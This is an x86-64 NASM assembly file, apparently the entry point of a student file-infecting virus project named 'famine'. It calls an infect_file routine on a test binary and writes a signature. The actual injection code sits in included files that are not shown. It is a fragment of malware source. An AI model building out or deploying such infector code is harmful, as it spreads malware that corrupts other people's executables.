%include "include.s"

 ;   lea r15, [rel jump + 1]
 ;   cmp byte [r15], 0x90                ; cette ligne permet de quiter le code une fois qu'il a été infecter
 ;   jnz close_mmap

section .text
    global main
    extern printf

main:
    push rbp
    mov rbp, rsp
    sub rsp, famine_size                        ;   le segv est sur la stack
    push rdx
    push rcx
    push rdi
    push rsi
    lea rdi, [rel ptest]
    mov [rsp + fileName], rdi
    mov rsi, rsp
    call infect_file

exit:
    mov rdi, 1
    lea rsi, [rel signature]
    mov rdx, SIGNATURE_SIZE
    mov rax, SYS_WRITE
    syscall
    pop rsi
    pop rdi
    pop rcx
    pop rdx
    leave

jump:
    ret
    nop
    nop
    nop
    nop

%include "injection.s"

%include "ft_memcpy.s"

%include "ft_strcmp.s"

;  void append_signature(char *name)
append_signature:
    mov rsi, O_WRONLY | O_APPEND
    mov rax, SYS_OPEN
    syscall
    mov rdi, rax 
    call putnbr
 ;   lea rsi, [rel signature]
 ;   mov rdx, SIGNATURE_SIZE
 ;   mov rax, SYS_WRITE
 ;   syscall
 ;   mov rax, SYS_CLOSE
 ;   syscall
    ret

%include "putnbr.s"

%include "data.s"